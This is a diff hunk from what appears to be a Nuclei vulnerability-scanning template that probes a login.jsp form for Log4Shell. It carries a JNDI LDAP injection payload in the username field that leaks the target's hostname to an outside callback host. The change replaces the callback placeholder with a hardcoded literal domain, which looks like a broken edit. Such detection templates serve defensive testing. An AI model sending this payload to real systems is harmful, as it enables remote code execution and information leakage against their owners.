@@ -33,7 +33,7 @@ http:
         Origin: {{BaseURL}}
         Referer: {{BaseURL}}/login.jsp
 
-        username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&submit=
+        username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com}&password=admin&submit=
 
     matchers-condition: and
     matchers:
